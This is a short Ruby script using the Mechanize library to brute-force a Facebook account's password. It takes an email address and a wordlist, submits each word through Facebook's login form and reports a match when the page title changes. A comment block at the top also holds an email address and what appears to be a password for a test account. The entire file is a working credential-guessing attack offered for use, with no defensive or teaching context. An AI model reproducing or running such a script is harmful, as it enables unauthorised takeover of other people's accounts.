#!/usr/bin/ruby
=begin 
mechanize
------------------------
opject = Mechanize.new
page = opject.get(site)
form = page.form_with(:name => "value")
from.field_with(:name => "value").value = ""
$page2 = $m.submit(from)
$page2.search(xpath)
-------------------------------
facebook account
main.test@mail.ru
odfklsafjdlska
=end
require "mechanize"
$mail  = ARGV[0]
$wordlist = ARGV[1]
$m = Mechanize.new
$page1 = $m.get("https://en-gb.facebook.com/")
$form = $page1.form_with(:id => 'login_form')
for i in IO.readlines($wordlist)
	$form.field_with(:id => 'email').value = $mail
	$form.field_with(:id => 'pass').value = i
	$page2 = $m.submit($form)
	puts "using #{i}"
	if $page2.search("//title").text == "Facebook" then
		puts "the password is found #{i}"
		break
	end
end